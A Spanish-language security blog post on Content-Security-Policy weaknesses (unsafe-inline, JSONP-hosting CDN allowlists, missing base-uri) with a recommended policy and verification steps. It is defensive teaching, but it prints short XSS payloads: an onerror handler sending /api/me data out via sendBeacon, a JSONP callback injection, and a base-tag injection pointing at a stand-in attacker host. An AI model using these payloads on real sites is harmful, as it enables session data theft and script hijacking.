---
title: "Anatomía de una CSP: por qué casi todas las políticas que veo no sirven"
slug: anatomia-de-una-csp
lang: es
translation_key: csp-anatomy
type: research
date: 2026-07-22
updated: 2026-08-11
featured: true
pinned: true
summary: >
  Una Content-Security-Policy mal escrita da una sensación de seguridad que no existe.
  Desmonto las tres construcciones que aparecen en casi todas las políticas reales y
  explico por qué cada una devuelve la ejecución de scripts al atacante.
tags: [web, csp, xss, defensa, navegador]
toc: true
---

Llevo años leyendo cabeceras `Content-Security-Policy` en auditorías, y el patrón se
repite: la política existe, el equipo la considera un control resuelto, y sin embargo
no impide la ejecución de scripts inyectados. La CSP es un buen mecanismo. El problema
es que su superficie de configuración es enorme y casi todos los tutoriales enseñan
justo las construcciones que la anulan.

Esto es un desmontaje de las tres que más me encuentro.

## Qué hace realmente una CSP

Antes del desmontaje, el modelo mental correcto.

Una CSP es una lista de reglas que el servidor envía al navegador y que el navegador
aplica sobre **los recursos que la página intenta cargar o ejecutar**. No filtra
entrada, no sanea salida y no impide que exista una inyección. Lo que hace es reducir
lo que un atacante puede *hacer* con una inyección que ya existe.

::: note title="El matiz que importa"
La CSP es una segunda línea de defensa. Si tu único control contra XSS es la CSP,
el problema no es la política: es que no estás escapando la salida.
:::

La cabecera es una lista de directivas separadas por `;`, cada una con una lista de
orígenes permitidos:

```http title="Respuesta HTTP"
HTTP/2 200
content-type: text/html; charset=utf-8
content-security-policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'none'
```

`default-src` es el fallback para las directivas de *fetch* que no se declaren
explícitamente. Las que no heredan de `default-src` son la primera trampa, y las veremos
al final.

## Fallo 1: `script-src 'unsafe-inline'`

Esta es la más común con diferencia, y la más terminal.

```http
content-security-policy: default-src 'self'; script-src 'self' 'unsafe-inline'
```

`'unsafe-inline'` permite que el navegador ejecute cualquier `<script>` en línea y
cualquier atributo `on*`. Es exactamente el vector que un XSS reflejado o almacenado
utiliza. Con esta directiva, la política no aporta **nada** contra XSS:

```html title="El payload que la política permite"
<img src=x onerror="fetch('/api/me').then(r=>r.json()).then(d=>navigator.sendBeacon('/collect',JSON.stringify(d)))">
```

La razón por la que aparece tanto es mecánica: alguien añade la CSP, la página se rompe
porque tiene scripts en línea, y `'unsafe-inline'` hace que deje de romperse. Se apunta
la tarea como cerrada.

### Qué hacer en su lugar

Hay tres salidas reales, en orden de preferencia:

1. **Externalizar todo.** Cada `<script>` en línea pasa a ser un fichero servido desde
   el mismo origen. Es lo más limpio y lo que hace este sitio: la política es
   `script-src 'self'` sin excepciones.
2. **Nonces por respuesta.** El servidor genera un valor aleatorio por respuesta y lo
   pone tanto en la cabecera como en cada `<script nonce="...">`.
3. **Hashes.** Para scripts en línea que nunca cambian, `'sha256-...'` del contenido exacto.

::: warning title="El nonce solo vale si es impredecible"
Un nonce reutilizado entre respuestas, derivado del ID de sesión o generado con un PRNG
no criptográfico es un nonce que el atacante puede adivinar o extraer. Tiene que salir
de un CSPRNG y ser distinto en cada respuesta. Si tu página está en caché estática,
los nonces no son la herramienta correcta.
:::

```python title="Generación correcta de nonce" highlight="6,11"
import secrets
from flask import g, render_template, make_response

@app.before_request
def issue_nonce():
    # 128 bits desde el CSPRNG del sistema, uno por respuesta.
    g.csp_nonce = secrets.token_urlsafe(16)

@app.after_request
def apply_csp(response):
    policy = (
        "default-src 'none'; "
        f"script-src 'self' 'nonce-{g.csp_nonce}'; "
        "style-src 'self'; img-src 'self' data:; "
        "connect-src 'self'; base-uri 'none'; "
        "form-action 'self'; frame-ancestors 'none'"
    )
    response.headers["Content-Security-Policy"] = policy
    return response
```

## Fallo 2: comodines y CDNs en `script-src`

La segunda construcción que veo constantemente:

```http
content-security-policy: script-src 'self' https://cdn.example.com https://*.googleapis.com
```

El razonamiento es «solo permito orígenes de confianza». El problema es que un origen
no es una unidad de confianza útil cuando ese origen aloja contenido de terceros.

Muchos CDN públicos sirven bibliotecas arbitrarias bajo rutas arbitrarias. Si un
atacante puede cargar cualquier fichero de ese origen, puede buscar entre ellos alguno
que le dé ejecución indirecta: una versión antigua de una biblioteca con un
*gadget* conocido, o un endpoint que devuelva JavaScript a partir de un parámetro.

::: danger title="El caso JSONP"
Un endpoint JSONP en un origen permitido convierte la política en decorativa. El
atacante inyecta `<script src="https://origen-permitido/api?callback=alert(1)//">`
y el propio origen de confianza devuelve el código del atacante, con la bendición de la CSP.
:::

La regla práctica: **un origen en `script-src` es tan fuerte como el contenido más
débil que ese origen sirva a cualquiera**. Si no controlas todo lo que hay ahí, no es
un origen de confianza.

La alternativa es autoalojar. Cuesta unos kilobytes y elimina la categoría entera:

```bash title="Autoalojar en lugar de confiar en un CDN"
# En lugar de <script src="https://cdn.example.com/lib@3.2.1/dist/lib.min.js">
curl -fsSLO https://cdn.example.com/lib@3.2.1/dist/lib.min.js
sha384sum lib.min.js          # contrastar con el hash publicado por el proyecto
mv lib.min.js static/vendor/
```

## Fallo 3: olvidar las directivas que no heredan

Esta es la más sutil, y la que separa una política escrita a mano de una copiada.

`default-src` **no** cubre todas las directivas. Estas son independientes y, si no las
declaras, quedan sin restricción:

| Directiva | Si la omites | Consecuencia |
|:----------|:-------------|:-------------|
| `base-uri` | sin restricción | inyección de `<base href>` reescribe todas las URL relativas |
| `form-action` | sin restricción | los formularios pueden enviarse a un host del atacante |
| `frame-ancestors` | sin restricción | la página es enmarcable: clickjacking |
| `sandbox` | no aplica | — |
| `report-uri` / `report-to` | no hay informes | pierdes la telemetría |

El caso de `base-uri` es el que más subestima la gente. Con una inyección de HTML
limitada —sin `<script>`, sin `on*`— basta esto:

```html
<base href="https://atacante.tld/">
```

A partir de ese punto, todo `<script src="app.js">` relativo de la página se resuelve
contra el dominio del atacante. La política de `script-src 'self'` no ayuda: para el
navegador el script se está cargando desde el origen que `<base>` acaba de declarar.

Por eso este sitio declara `base-uri 'none'` y `default-src 'none'`, y añade
explícitamente cada directiva que necesita.

## Una política que sí sirve

Punto de partida para una aplicación que sirve HTML dinámico:

```http title="Política base defendible"
content-security-policy:
  default-src 'none';
  script-src 'self';
  style-src 'self';
  img-src 'self' data:;
  font-src 'self';
  connect-src 'self';
  manifest-src 'self';
  media-src 'self';
  base-uri 'none';
  form-action 'self';
  frame-ancestors 'none';
  object-src 'none';
  upgrade-insecure-requests
```

`default-src 'none'` como base significa que todo lo que no hayas permitido
explícitamente está bloqueado. Es incómodo de desplegar y es el motivo por el que
funciona: te obliga a enumerar lo que la aplicación realmente carga.

## Cómo verificarla de verdad

No te fíes de que la cabecera esté presente. Verifica que hace lo que crees.

::: terminal title="czrxplo1t@lab"
czrxplo1t@lab:~$ curl -sI https://ejemplo.tld/ | grep -i content-security-policy
content-security-policy: default-src 'none'; script-src 'self'; base-uri 'none'
czrxplo1t@lab:~$ curl -s https://ejemplo.tld/ | grep -coE '<script(?![^>]*src=)'
0
:::

Los tres controles que hago siempre:

- [x] La cabecera está en **todas** las respuestas HTML, no solo en la portada.
- [x] La política no contiene `'unsafe-inline'` ni `'unsafe-eval'` en `script-src`.
- [x] `base-uri`, `form-action`, `frame-ancestors` y `object-src` están declaradas.
- [ ] Hay un `report-to` recogiendo violaciones en producción.[^report]

::: spoiler title="Por qué el último no está marcado en la mayoría de auditorías"
Porque casi nadie lo despliega. Los informes de violación son la única forma de saber
si tu política está rompiendo algo para usuarios reales antes de que te lo cuenten por
soporte. Desplegar primero en modo `Content-Security-Policy-Report-Only`, recoger una
semana de informes y solo entonces pasar a modo obligatorio es la diferencia entre una
política que sobrevive y una que alguien desactiva el martes.
:::

## Qué se lleva el defensor

Tres frases:

1. `'unsafe-inline'` en `script-src` anula la política contra XSS. No hay matices.
2. Un origen de terceros en `script-src` es tan fuerte como el peor fichero que sirva.
3. `default-src` no cubre `base-uri`, `form-action` ni `frame-ancestors`. Decláralas.

::: references
- [Content Security Policy Level 3 — W3C](https://www.w3.org/TR/CSP3/)
- [CSP en MDN](https://developer.mozilla.org/es/docs/Web/HTTP/Headers/Content-Security-Policy)
- [OWASP Content Security Policy Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html)
:::

[^report]: `report-uri` está obsoleta a favor de `report-to`, pero el soporte de navegador de `report-to` no es universal. Declarar ambas sigue siendo la opción pragmática.
